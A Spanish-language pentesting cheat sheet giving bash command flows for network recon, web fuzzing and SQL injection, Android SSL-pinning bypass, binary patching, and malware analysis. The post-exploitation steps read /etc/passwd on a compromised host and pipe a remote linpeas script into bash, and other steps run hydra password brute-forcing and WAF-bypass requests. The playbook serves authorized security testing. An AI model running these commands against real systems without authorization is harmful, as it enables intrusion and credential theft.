```bash
# Ejecutar siempre al inicio de sesión
export TARGET="<valor>"
export OUTPUT_DIR="$HOME/pentest/$(date +%Y%m%d_%H%M%S)"
```

## 📊 Flujos por Categoría

### 🌐 NETWORK — Red/Infraestructura

**Fase 1 — Recon**
```bash
# Descubrimiento de hosts
nmap -sn $TARGET/24 -oG $OUTPUT_DIR/recon/hosts_alive.txt
# Escaneo agresivo top-1000 puertos
nmap -sV -sC -O -T4 --open -oA $OUTPUT_DIR/recon/scan $TARGET
# Escaneo completo UDP (crítico para SNMP/NTP)
nmap -sU --top-ports 100 -oA $OUTPUT_DIR/recon/udp_scan $TARGET
# Enum de servicios con scripts NSE
nmap --script="vuln,auth,exploit" -p$(grep open $OUTPUT_DIR/recon/scan.gnmap | grep -oP '\d+/open' | cut -d/ -f1 | tr '\n' ',') $TARGET -oA $OUTPUT_DIR/recon/vulns
```

**Fase 2 — Explotación**
```bash
# Búsqueda de exploits para versiones detectadas
searchsploit "$(grep -oP 'Service: \K.*' $OUTPUT_DIR/recon/scan.nmap | head -5)"
# Metasploit auxiliar
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET; run; exit"
# Ataque de credenciales (SSH/FTP/SMB)
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -o $OUTPUT_DIR/exploits/hydra_ssh.txt
```

**Fase 3 — Post-Explotación**
```bash
# Si hay acceso SSH:
ssh user@$TARGET "id; uname -a; cat /etc/passwd; ss -tlnp" | tee $OUTPUT_DIR/logs/post_recon.txt
# Enum local (ejecutar en host comprometido)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee /tmp/linpeas.txt
```

**Fallback:** `masscan -p1-65535 $TARGET --rate=1000 -oL $OUTPUT_DIR/recon/masscan.txt`

### 🌍 WEB — Aplicaciones HTTP/HTTPS

**Fase 1 — Recon**
```bash
# Descubrimiento de subdominios
subfinder -d $TARGET -o $OUTPUT_DIR/recon/subdomains.txt
amass enum -d $TARGET -o $OUTPUT_DIR/recon/amass.txt
# Fingerprint tecnologías
whatweb -a 3 $TARGET | tee $OUTPUT_DIR/recon/whatweb.txt
# Spider + waybackurls
katana -u $TARGET -d 3 -o $OUTPUT_DIR/recon/spider.txt
echo $TARGET | waybackurls | tee $OUTPUT_DIR/recon/wayback.txt
```

**Fase 2 — Fuzzing & Vuln**
```bash
# Dir/file fuzzing
ffuf -u "https://$TARGET/FUZZ" -w $WORDLIST -mc 200,301,302,403 -rate 80 \
  -o $OUTPUT_DIR/exploits/ffuf.json -of json

# Parameter fuzzing (FUZZ en parámetros GET)
ffuf -u "https://$TARGET/endpoint?FUZZ=test" -w $WORDLIST -mc all -fr "error|404" \
  -o $OUTPUT_DIR/exploits/param_fuzz.json -of json

# SQLi automático
sqlmap -u "https://$TARGET/endpoint?id=1" --batch --level=3 --risk=2 \
  --output-dir=$OUTPUT_DIR/exploits/sqlmap

# XSS activo
dalfox url "https://$TARGET/endpoint?q=test" -o $OUTPUT_DIR/exploits/xss.txt

# Scan con Nuclei (templates CVE)
nuclei -u $TARGET -t cves/ -t exposures/ -o $OUTPUT_DIR/exploits/nuclei.txt
```

**Fase 3 — Bypass & Evasión**
```bash
# WAF detection + bypass
wafw00f $TARGET
# Header injection
curl -sk "https://$TARGET" -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin" -v
# Path traversal
ffuf -u "https://$TARGET/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200
```

**Fallback:** `nikto -h $TARGET -o $OUTPUT_DIR/exploits/nikto.txt -Format htm`

### 📱 APK — Android Reverse Engineering

**Fase 1 — Estático**
```bash
sha256sum $APK | tee $OUTPUT_DIR/artifacts/apk.sha256
apktool d $APK -o $OUTPUT_DIR/artifacts/apk_unpacked/
# Extracción de secrets
grep -rE "(api_key|secret|token|password|Bearer|-----BEGIN)" \
  $OUTPUT_DIR/artifacts/apk_unpacked/ | tee $OUTPUT_DIR/recon/secrets.txt
# Analisis de libs nativas
for lib in $OUTPUT_DIR/artifacts/apk_unpacked/lib/**/*.so; do
  echo "=== $lib ===" >> $OUTPUT_DIR/recon/native_strings.txt
  strings "$lib" | grep -iE "http|ssl|grpc|\.com|\.io|key|token|pass" >> $OUTPUT_DIR/recon/native_strings.txt
done
# Permisos peligrosos
grep -i "uses-permission" $OUTPUT_DIR/artifacts/apk_unpacked/AndroidManifest.xml | tee $OUTPUT_DIR/recon/permissions.txt
```

**Fase 2 — Dinámico / MITM**
```bash
# SSL Pinning bypass con Frida
frida -U -l /opt/frida-scripts/ssl-pinning-bypass.js -f com.target.app --no-pause
# reFlutter (Flutter SSL bypass + snapshot dump)
reFlutter $APK --release
# MITM con mitmproxy + script para gRPC/Protobuf
mitmproxy -s /opt/scripts/mitm_grpc_decode.py \
  --mode transparent --ssl-insecure -w $OUTPUT_DIR/artifacts/traffic.mitm
# Traffic dump
tcpdump -i any -w $OUTPUT_DIR/artifacts/capture.pcap &
adb shell am start -n com.target.app/.MainActivity
sleep 30; kill %1
tshark -r $OUTPUT_DIR/artifacts/capture.pcap -Y "http or tls or dns" \
  -T fields -e frame.time -e ip.dst -e http.request.uri > $OUTPUT_DIR/recon/traffic.txt
```

**Fase 3 — Jadx + decompile**
```bash
jadx -d $OUTPUT_DIR/artifacts/jadx_out $APK
grep -rE "class.*Activity|class.*Service|class.*Receiver" \
  $OUTPUT_DIR/artifacts/jadx_out/sources/ | head -30
```

**Fallback:** `androguard analyze -i $APK -o $OUTPUT_DIR/artifacts/androguard.json`

### 🔩 BINARY — ELF/PE/DLL/SO

**Fase 1 — Identificación**
```bash
sha256sum $BIN | tee $OUTPUT_DIR/artifacts/bin.sha256
file $BIN
readelf -h $BIN 2>/dev/null || dumpbin /headers $BIN 2>/dev/null
strings $BIN | sort -u > $OUTPUT_DIR/recon/strings.txt
strings $BIN | grep -iE "http|key|pass|token|exec|system|/etc|/tmp" \
  > $OUTPUT_DIR/recon/interesting_strings.txt
```

**Fase 2 — Análisis Estático con Radare2**
```bash
r2 -A $BIN 2>/dev/null << 'EOF'
aa        ; análisis completo
afl       ; listar funciones
iz        ; strings internas
axt @sym.main  ; referencias cruzadas a main
pdf @sym.main  ; desensamblar main
EOF | tee $OUTPUT_DIR/recon/r2_analysis.txt

# Imports/Exports
objdump -x $BIN | grep -E "FUNC|IMPORT|EXPORT|NEEDED" | tee $OUTPUT_DIR/recon/imports.txt
```

**Fase 3 — Parcheo**
```bash
# Parchear offset específico (ej: bypass de verificación)
r2 -w $BIN -c "s <OFFSET>; wa nop nop; wci; pd 5 @<OFFSET>"
# Verificar patch
md5sum $BIN > $OUTPUT_DIR/artifacts/patched.md5
```

**Fallback:** `ghidra_headless /tmp/ghidra_proj TmpProj -import $BIN -postScript PrintAST.java 2>&1 | tee $OUTPUT_DIR/recon/ghidra.txt`

### 🦠 MALWARE — Análisis Estático + Dinámico

**Fase 1 — Estático**
```bash
sha256sum $MAL | tee $OUTPUT_DIR/artifacts/malware.sha256
# YARA scan
yara -r $RULES/ $MAL | tee $OUTPUT_DIR/recon/yara_matches.txt
# IOC extraction
strings $MAL | grep -iE "(https?://|cmd\.exe|powershell|reg add|HKLM|schtasks|\\.exe|\\.dll|\\.vbs)" \
  | sort -u | tee $OUTPUT_DIR/recon/iocs.txt
# PE analysis (Windows malware)
pecheck $MAL | tee $OUTPUT_DIR/recon/pe_info.txt
# VirusTotal hash check (si hay red)
curl -s "https://www.virustotal.com/api/v3/files/$(sha256sum $MAL | cut -d' ' -f1)" \
  -H "x-apikey: $VT_API_KEY" | jq '.data.attributes.last_analysis_stats' \
  | tee $OUTPUT_DIR/recon/vt_result.json
```

**Fase 2 — Dinámico (sandbox aislado)**
```bash
# Captura de red durante ejecución (entorno aislado VM/sandbox)
tcpdump -i any -w $OUTPUT_DIR/artifacts/malware_traffic.pcap &
TCPDUMP_PID=$!
# Monitoreo de syscalls
strace -f -e trace=file,socket,connect,execve $MAL 2>&1 | tee $OUTPUT_DIR/logs/strace.txt &
timeout 60 wine $MAL 2>/dev/null  # PE en Linux
kill $TCPDUMP_PID
tshark -r $OUTPUT_DIR/artifacts/malware_traffic.pcap \
  -Y "http or dns or tls" -T fields \
  -e frame.time -e ip.dst -e dns.qry.name -e http.request.full_uri \
  | tee $OUTPUT_DIR/recon/c2_traffic.txt
```

**Fallback:** `clamav --detect-pua $MAL && strings $MAL | grep -c "http" && echo "Candidate C2 strings found"`

## 🧩 Pipeline de Integración Automática

```
Detección auto por extensión/puerto:
  .exe .dll .bin → binary → (si yara match malware) → malware
  .apk           → apk → (si gRPC detectado) → grpc
  .raw .vmem     → memory
  IP:PORT        → network → (si 80/443) → web → (si /graphql) → api
  dominio        → osint + network + web

Pipeline completo (máximo coverage):
  osint → network → web → api/grpc → binary/apk → memory → report
```

## 🔁 FALLBACKS por Herramienta

| Herramienta primaria | Falla si... | Fallback inmediato |
|---------------------|-------------|---------------------|
| `nmap` | permisos root | `masscan -p1-65535 $TARGET --rate=500` |
| `r2` | binario corrupto | `objdump -d $BIN \| head -200` |
| `vol` | perfil no detectado | `strings $MEM \| grep -iE "http\|cmd"` |
| `ffuf` | WAF bloquea | `gobuster dir -u $URL -w $WORDLIST -t 10` |
| `frida` | sin root/jailbreak | `reFlutter $APK --release` |
| `apktool` | APK firmado protegido | `jadx -d /tmp/jadx_out $APK` |
| `grpcurl` | TLS forzado | `grpcurl -insecure $HOST:$PORT list` |
| `sqlmap` | rate limit | `sqlmap -u $URL --delay=2 --randomize-agent` |
| cualquiera | sin herramienta | `strace -e trace=file,socket,connect $CMD 2>&1` |
